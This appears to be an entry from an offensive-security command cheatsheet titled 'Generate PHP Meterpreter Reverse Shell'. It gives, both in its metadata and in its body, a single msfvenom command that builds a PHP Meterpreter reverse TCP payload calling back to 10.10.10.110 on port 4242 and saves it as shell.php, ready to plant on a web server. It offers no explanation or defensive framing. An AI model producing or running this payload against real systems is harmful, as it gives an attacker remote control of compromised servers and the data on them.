---
id: 77fd5612-f53f-4de0-bfad-50d2f6c98240
name: Generate PHP Meterpreter Reverse Shell
type: command
executor: bash
data: $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f
  raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php
  && pbpaste >> shell.php
output: null
created_at: '2023-04-06T03:56:21.275365+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate PHP Meterpreter Reverse Shell

```bash
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```


